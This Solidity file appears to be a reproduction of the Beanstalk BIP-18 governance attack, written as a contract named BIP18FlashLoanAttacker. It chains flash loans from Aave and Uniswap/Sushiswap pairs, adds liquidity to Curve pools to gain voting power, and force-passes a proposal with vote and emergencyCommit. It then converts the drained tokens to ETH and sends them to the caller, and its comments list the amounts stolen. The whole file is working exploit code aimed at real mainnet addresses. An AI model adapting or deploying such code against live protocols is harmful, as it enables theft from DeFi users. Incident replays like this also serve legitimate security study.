pragma solidity ^0.8.10;

import {FlashLoanReceiverBase} from "./FlashLoanReceiverBase.sol";
import {ILendingPool} from "./interfaces/ILendingPool.sol";
import {IERC20} from "./interfaces/IERC20.sol";
import {ILendingPoolAddressesProvider} from "./interfaces/ILendingPoolAddressesProvider.sol";

// import "hardhat/console.sol";

interface IDiamond {
    struct FacetCut {
        address facetAddress;
        uint8 action;
        bytes4[] functionSelectors;
    }

    receive() external payable;

    fallback() external payable;

    function depositBeans(uint256 amount) external;

    function propose(
        FacetCut[] calldata cut,
        address _init,
        bytes calldata _calldata,
        uint8 _pauseOrUnpause
    ) external;

    function numberOfBips() external view returns (uint32);
}

interface IDiamondCut {
    enum FacetCutAction {
        Add,
        Replace,
        Remove
    }

    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }
}

interface IBeanstalkProtocolDiamond {
    //SiloFacet
    function depositBeans(uint256 amount) external;

    //GovernanceFacet
    function propose(
        IDiamondCut.FacetCut[] calldata _diamondCut,
        address _init,
        bytes calldata _calldata,
        uint8 _pauseOrUnpause
    ) external;

    function vote(uint32 bip) external;

    function emergencyCommit(uint32 bip) external;

    //SiloV2Facet
    function deposit(address token, uint256 amount) external;
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
}

interface IAaveLendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IFlashLoanReceiver {
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IUniswapV2Pair is IERC20 {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IUniswapV2Router {
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function swapExactETHForTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable returns (uint[] memory amounts);
}

interface ICurvePool is IERC20 {
    function add_liquidity(
        uint256[2] memory amounts,
        uint256 min_mint_amount
    ) external;

    function add_liquidity(
        uint256[3] memory amounts,
        uint256 min_mint_amount
    ) external;

    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;

    function remove_liquidity_one_coin(
        uint256 amount,
        int128 i,
        uint256
    ) external;
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface IUniswapV2Callee {
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external;
}

contract BIP18FlashLoanAttacker is FlashLoanReceiverBase, IUniswapV2Callee {
    IBeanstalkProtocolDiamond private constant beanstalkProtocol =
        IBeanstalkProtocolDiamond(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);
    IAaveLendingPool private constant aaveLendingPool =
        IAaveLendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    // https://etherscan.io/address/0x46E4D8A1322B9448905225E52F914094dBd6dDdF#code
    IUniswapV2Pair private constant sushiSwaplusdOhmPair =
        IUniswapV2Pair(0x46E4D8A1322B9448905225E52F914094dBd6dDdF);

    IUniswapV2Pair private constant uniSwapBeansWethPair =
        IUniswapV2Pair(0x87898263B6C5BABe34b4ec53F22d98430b91e371);

    IERC20 private constant beans =
        IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);
    IERC20 private constant DAI =
        IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant USDC =
        IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant USDT =
        IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant LUSD =
        IERC20(0x5f98805A4E8be255a32880FDeC7F6728C6568bA0);
    IERC20 private constant Curve3Crv =
        IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);
    IWETH private constant WETH =
        IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    ICurvePool private constant curve3pool =
        ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
    ICurvePool private constant curveExchange =
        ICurvePool(0xEd279fDD11cA84bEef15AF5D39BB4d4bEE23F0cA);
    ICurvePool private constant curveBeans3CrvPool =
        ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);
    ICurvePool private constant curveBeansLusdPool =
        ICurvePool(0xD652c40fBb3f06d6B58Cb9aa9CFF063eE63d465D);

    IUniswapV3Router private constant uniswapV3Router =
        IUniswapV3Router(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IUniswapV2Router private constant uniswapV2Router =
        IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 private constant UINT256_MAX = type(uint256).max;

    constructor(
        ILendingPoolAddressesProvider provider
    ) FlashLoanReceiverBase(provider) {}

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {
        /* ------------------------------------------------------ */
        /*                  Turn WETH TO Beans                    */
        /* ------------------------------------------------------ */
        uint256 beansBalance = beans.balanceOf(address(uniSwapBeansWethPair));
        uniSwapBeansWethPair.swap( // callback -> uniswapV2Call
            0,
            (beansBalance * 99) / 100,
            address(this),
            new bytes(1)
        );
        /* ------------------------------------------------------ */
        /*         LUSD3CRV-f.exchange convert 3Crv to LUSD        */
        /* ------------------------------------------------------ */
        LUSD.approve(address(curveExchange), UINT256_MAX);
        curveExchange.exchange(0, 1, LUSD.balanceOf(address(this)), 0);
        /* ------------------------------------------------------ */
        /*                           還錢                           */
        /* ------------------------------------------------------ */
        for (uint i = 0; i < assets.length; i++) {
            IERC20(assets[i]).approve(address(aaveLendingPool), UINT256_MAX);
        }
        /* ------------------------------------------------------ */
        /*        remove liqudity to return AAVE flash loan       */
        /* ------------------------------------------------------ */
        uint256 threeCrvBalance = Curve3Crv.balanceOf(address(this));

        curve3pool.remove_liquidity_one_coin(
            (threeCrvBalance * 35) / 100,
            0,
            0
        );
        curve3pool.remove_liquidity_one_coin(
            (threeCrvBalance * 50) / 100,
            1,
            0
        );
        curve3pool.remove_liquidity_one_coin(
            (threeCrvBalance * 15) / 100,
            2,
            0
        );

        // TODO:
        uniSwapBeansWethPair.approve(address(uniswapV2Router), UINT256_MAX);
        uniswapV2Router.removeLiquidityETH(
            address(beans),
            uniSwapBeansWethPair.balanceOf(address(this)),
            0,
            0,
            address(this),
            block.timestamp
        );
        return true;
    }

    function attack(
        address receiverAddress,
        address[] calldata _assets,
        uint256[] calldata _amounts,
        uint256[] calldata modes,
        bytes calldata _params
    ) external {
        aaveLendingPool.flashLoan(
            address(this),
            _assets,
            _amounts,
            new uint256[](3),
            address(this),
            new bytes(0),
            0
        );
        _swapAllTokensEarnedToETH();
    }

    function uniswapV2Call(
        // swap 以後會呼叫這邊
        address,
        uint amount0,
        uint amount1,
        bytes calldata
    ) external override {
        if (msg.sender == address(uniSwapBeansWethPair)) {
            uint256 lusdBalance = LUSD.balanceOf(address(sushiSwaplusdOhmPair));
            sushiSwaplusdOhmPair.swap(
                (lusdBalance * 99) / 100,
                0,
                address(this),
                new bytes(1)
            );
            //return Beans flash loan
            uint256 repayBeansAmount = amount1 + (amount1 * 3) / 997 + 1;
            beans.transfer(address(uniSwapBeansWethPair), repayBeansAmount);
        } else {
            addCurve3PoolLiquidity();
            exchange3CrvToLusd();
            addLiquidityToBeans3CrvPool();
            addLiquidityToBeansLusdCurvePool();
            depositVoteAndExecute();
            //return Lusd flash loan
            uint256 repayLusdAmount = amount0 + (amount0 * 3) / 997 + 1;
            LUSD.transfer(address(sushiSwaplusdOhmPair), repayLusdAmount);
        }
    }

    function addCurve3PoolLiquidity() private {
        // curve3pool.add_liquidity 350,000,000 DAI, 500,000,000 USDC, 150,000,000 USDT to get 979,691,328 3Crv
        uint256 daiBalance = DAI.balanceOf(address(this));
        uint256 usdcBalance = USDC.balanceOf(address(this));
        uint256 usdtBalance = USDT.balanceOf(address(this));
        address curve3poolAddr = address(curve3pool);
        USDT.approve(curve3poolAddr, UINT256_MAX);
        DAI.approve(curve3poolAddr, UINT256_MAX);
        USDC.approve(curve3poolAddr, UINT256_MAX);
        uint256[3] memory amounts;
        amounts[0] = daiBalance;
        amounts[1] = usdcBalance;
        amounts[2] = usdtBalance;
        curve3pool.add_liquidity(amounts, 0);
    }

    function exchange3CrvToLusd() private {
        // LUSD3CRV-f.exchange to convert 15,000,000 3Crv to 15, 251,318 LUSD
        Curve3Crv.approve(address(curveExchange), UINT256_MAX);
        curveExchange.exchange(1, 0, 15000000e18, 0);
    }

    function addLiquidityToBeans3CrvPool() private {
        // BEAN3CRV-f.add_liquidity to convert 964,691,328 3Crv to 795,425,740 BEAN3CRV-f
        uint256 curve3CrvBalance = Curve3Crv.balanceOf(address(this));
        Curve3Crv.approve(address(curveBeans3CrvPool), UINT256_MAX);
        uint256[2] memory amounts;
        amounts[1] = curve3CrvBalance;
        curveBeans3CrvPool.add_liquidity(amounts, 0);
    }

    function addLiquidityToBeansLusdCurvePool() private {
        // BEANLUSD-f.add_liquidity to convert 32,100,950 BEAN and 26,894,383 LUSD and get 58,924,887 BEANLUSD-f
        uint256 lusdBalance = LUSD.balanceOf(address(this));
        uint256 beansBalance = beans.balanceOf(address(this));
        beans.approve(address(curveBeansLusdPool), UINT256_MAX);
        LUSD.approve(address(curveBeansLusdPool), UINT256_MAX);
        uint256[2] memory amounts;
        amounts[0] = beansBalance;
        amounts[1] = lusdBalance;
        curveBeansLusdPool.add_liquidity(amounts, 0);
    }

    function depositVoteAndExecute() private {
        // Deposit 795,425,740 BEAN3CRV-f and 58,924,887 BEANLUSD-f into Diamond
        // Diamond.vote (bip=18)
        // Diamond.emergencyCommit(bip=18) and hacker proposed _init contract is executed to get 36,084,584 BEAN and 0.54 UNI-V2_WETH_BEAN, 874,663,982 BEAN3CRV-f, 60,562,844 BEANLUSD-f to hacker contract
        depositForVotingPower();
        beanstalkProtocol.vote(18);
        beanstalkProtocol.emergencyCommit(18);
        uint256 beans3crvBalance = curveBeans3CrvPool.balanceOf(address(this));
        uint256 beansLusdBalance = curveBeansLusdPool.balanceOf(address(this));
        curveBeans3CrvPool.remove_liquidity_one_coin(beans3crvBalance, 1, 0);
        curveBeansLusdPool.remove_liquidity_one_coin(beansLusdBalance, 1, 0);
    }

    function depositForVotingPower() private {
        //deposit to beans3Crv and beansLusd to get voting power
        uint256 beans3crvBalance = curveBeans3CrvPool.balanceOf(address(this));
        uint256 beansLusdBalance = curveBeansLusdPool.balanceOf(address(this));
        curveBeans3CrvPool.approve(address(beanstalkProtocol), UINT256_MAX);
        curveBeansLusdPool.approve(address(beanstalkProtocol), UINT256_MAX);
        beanstalkProtocol.deposit(
            address(curveBeans3CrvPool),
            beans3crvBalance
        );
        beanstalkProtocol.deposit(
            address(curveBeansLusdPool),
            beansLusdBalance
        );
    }

    function _swapAllTokensEarnedToETH() internal {
        // BEAN3CRV-f.remove_liquidity_one_coin 874,663,982 BEAN3CRV-f to get 1,007,734,729 3Crv
        // BEANLUSD-f.remove_liquidity_one_coin 60,562,844 BEANLUSD-f to get 28,149,504 LUSD
        // Flashloan back LUSD 11,795,706 and BEAN 32,197,543
        // LUSD3CRV-f.exchange to swap 16,471,404 LUSD to 16,184,690 3Crv
        // Burn 16,184,690 3Cry to get 522,487,380 USDC, 365,758,059 DAI, and 156,732,232 USDT
        // Flashloan back 150,135,000 USDT, 500,450,000 USDC, 350,315,000 DAI
        // Burn UNI-V2_WETH_BEAN 0.54 to get 10,883 WETH and 32,511,085 BEAN
        // Donate 250,000 USDC to Ukraine Crypto Donation
        // swap 15,443,059 DAI to 15,441,256 USDC
        // swap 37, 228,637 USDC to 11,822 WETH
        // Swap 6,597,232 USDT to 2,124 WETH
        // Profit 24,830 WETH is sent to hacker
        uint256 daiBalance = DAI.balanceOf(address(this));
        uint256 usdcBalance = USDC.balanceOf(address(this));
        uint256 usdtBalance = USDT.balanceOf(address(this));
        DAI.approve(address(uniswapV3Router), UINT256_MAX);
        USDC.approve(address(uniswapV3Router), UINT256_MAX);
        USDT.approve(address(uniswapV3Router), UINT256_MAX);
        uint24 poolFee = 3000;
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router
            .ExactInputSingleParams({
                tokenIn: address(DAI),
                tokenOut: address(WETH),
                fee: poolFee,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: daiBalance,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
        uniswapV3Router.exactInputSingle(params);

        params.tokenIn = address(USDC);
        params.amountIn = usdcBalance;
        uniswapV3Router.exactInputSingle(params);

        params.tokenIn = address(USDT);
        params.amountIn = usdtBalance;
        uniswapV3Router.exactInputSingle(params);

        WETH.withdraw(WETH.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
